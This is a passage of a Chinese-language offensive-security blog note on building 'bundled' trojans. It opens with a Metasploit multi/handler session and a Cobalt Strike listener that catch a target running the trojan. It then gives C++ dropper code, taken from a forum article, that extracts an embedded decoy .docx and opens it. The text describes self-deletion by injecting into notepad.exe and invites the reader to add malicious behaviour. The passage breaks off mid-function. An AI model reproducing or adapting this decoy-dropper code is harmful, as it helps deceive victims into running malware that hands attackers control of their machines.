<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">msf6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exploit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">multi/handler</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">run</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>靶机执行生成的捆绑程序即可上线</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407171623638.png" alt="image-20240717162355294"></p><hr><p>或者 CS 起个 http 监听器挂在 55555 端口, 靶机运行捆绑木马即可上线 CS</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407171624408.png" alt="image-20240717162459264"></p><hr><h2 id="cpp实现捆绑程序-todo" tabindex="-1"><a class="header-anchor" href="#cpp实现捆绑程序-todo"><span>cpp实现捆绑程序(TODO)</span></a></h2><blockquote><p><a href="https://forum.butian.net/share/1778" target="_blank" rel="noopener noreferrer">奇安信攻防社区-关于文件捆绑的实现 (butian.net)</a></p><p>https://chatgpt.com/share/a5f99e0a-eec2-4616-9d24-dafde74733f1</p></blockquote><p>上述文章中作者编写了如下程序, 运行该程序会创建一个新的 <code>.docx</code> 文件，并将资源文件的内容写入该文件。</p><p>打开 <code>.docx</code> 文件。</p><p>创建一个 <code>notepad.exe</code> 进程，并将删除当前程序的操作注入到该进程中，从而实现自删除功能。</p><p>当前程序实现的效果是执行 exe 后读取并生成 docx 文件然后删除 exe 文件, 需要后续修改来调用其他捆绑程序, 或者直接在当前项目中编写恶意行为</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191534695.png" alt="image-20240719153446495"></p><hr><p>使用 VisualStudio 创建一个 C++ 空项目添加下文中的 <code>Bundled.h</code> 头文件和 <code>Bundled.cpp</code> 源文件</p><p>添加资源文件</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191139278.png" alt="image-20240719113917994"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191139419.png" alt="image-20240719113952189"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191140569.png" alt="image-20240719114021276"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191140019.png" alt="image-20240719114030789"></p><p>这里 <code>资源类型</code> 直接手打个 <code>docx</code> 即可</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191141081.png" alt="image-20240719114059795"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191141986.png" alt="image-20240719114111736"></p><p>之后在 <code>资源视图</code> 中可以看到加入的资源</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191141508.png" alt="image-20240719114158224"></p><p>以这种方式添加的资源会被打包进程序中</p><p>可以右键资源项目查看资源符号</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191142760.png" alt="image-20240719114253552"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202407191143239.png" alt="image-20240719114308048"></p><p>这个资源符号值后续会用到, 用来读取该资源</p><hr><p><code>Bundled.h</code></p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// #pragma once 确保头文件只会被包含一次</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#pragma</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> once</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// Windows API的头文件</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;Windows.h&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">typedef</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> struct</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> DeleteStruct</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    FARPROC dwDeleteFile;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    CHAR </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[MAX_PATH];</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">};</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">typedef</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> BOOL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(WINAPI</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> wDeleteFileA)(</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    _In_ LPCSTR lpFileName</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    );</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>定义了一个结构体 <code>DeleteStruct</code>，包含两个成员：</p><ul><li><code>dwDeleteFile</code>：保存函数指针。</li><li><code>dwDeleteFile_param_1</code>：保存要删除的文件名。</li></ul><hr><p>定义了一个函数指针类型 <code>wDeleteFileA</code>，对应于Windows API的 <code>DeleteFileA</code> 函数</p><ul><li><p><code>WINAPI</code></p><p><code>WINAPI</code> 是一个调用约定，定义为 <code>__stdcall</code>，用于指示函数的参数从右到左压入堆栈，并由被调用函数清理堆栈。这是 Windows API 函数的标准调用约定。</p></li><li><p><code>(*wDeleteFileA)</code></p><p><code>(*wDeleteFileA)</code> 定义了一个名为 <code>wDeleteFileA</code> 的指针，这个指针指向一个符合特定签名的函数。</p></li><li><p>参数列表 <code>(_In_ LPCSTR lpFileName)</code></p><p>参数列表描述了该函数指针指向的函数所接受的参数类型：</p><ul><li><code>_In_</code> 是一个 SAL（Source Annotation Language）注释，指示参数是输入参数。</li><li><code>LPCSTR</code> 是一个指向常量字符串的指针，表示该函数接受一个指向常量字符串的指针作为参数。</li></ul></li></ul><p>总的来说定义了一个名为 <code>wDeleteFileA</code> 的新类型，这个类型是一个指向具有以下签名的函数的指针：</p><ul><li>返回类型为 <code>BOOL</code>（一个布尔值）。</li><li>调用约定为 <code>WINAPI</code>（Windows API 标准调用约定）。</li><li>接受一个参数：类型为 <code>LPCSTR</code>，即一个指向常量字符串的指针，表示文件名。</li></ul><hr><p><code>Bundled.cpp</code></p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &lt;iostream&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &lt;windows.h&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Bundled.h&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DWORD64 WINAPI </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">threadProc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(LPVOID lParam) {</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    INT RET </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 20000</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">size_t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 20000</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        RET </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> RET </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //循环一下起延时作用，防止线程创建了文件还没有关系，这样删除就失败了</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    wDeleteFileA kDeleteFileA;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    DeleteStruct</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> DS </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (DeleteStruct</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)lParam;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    kDeleteFileA </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (wDeleteFileA)</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-&gt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    kDeleteFileA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-&gt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //删除文件</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> RET;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">int</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">int</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> argc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">char*</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> argv</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[])</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    CHAR </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">PathFileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[MAX_PATH] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    CHAR </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[MAX_PATH] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    HRSRC Resource </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> FindResourceA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">MAKEINTRESOURCEA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">101</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;docx&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //得到资源文件HRSRC句柄</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    HGLOBAL ResourceGlobal </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> LoadResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, Resource);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //得到资源文件ResourceGlobal句柄</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    DWORD FileSize </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> SizeofResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, Resource);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //得到资源文件的大小</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    LPVOID PFILE </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> LockResource</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(ResourceGlobal);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //得到指向资源文件内容的指针</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    GetModuleFileNameA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, PathFileName, MAX_PATH);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //当前进程的路径和名称</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    strcpy_s</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FileName, </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">strrchr</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(PathFileName, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    /*</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    strrchr得到第二个参数最后出现的位置</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    d:\\\\xxxxx\\\\xxxxxx\\\\xxxx.exe在执行后得到\\\\xxxx.exe</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    所以需要+1把\\\\去掉</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    最后得到了完整的文件名</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    用strcpy_s把文件名复制到FileName中</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    */</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">size_t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> MAX_PATH; i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;.&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;d&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;o&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;c&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">            FileName</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;x&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">            break</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //循环找文件名中的.，找到后将文件名的后缀改为docx</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //这个步骤主要是为了方便，以后只需要改exe的名称不需要到代码中来改</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    HANDLE FILE </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> CreateFileA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FileName, FILE_ALL_ACCESS, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, CREATE_ALWAYS, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //创建文件名相同的文件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    DWORD dwSize;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    WriteFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(FILE, PFILE, FileSize, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">dwSize, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // 把资源文件中的内容写入</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    SHELLEXECUTEINFOA shellexecute </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">cbSize</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(shellexecute);</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">lpFile</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> FileName;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    shellexecute</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">nShow</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> SW_SHOW;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    ShellExecuteExA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">shellexecute);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //打开docx文件</span></span>
<span class="line"></span>
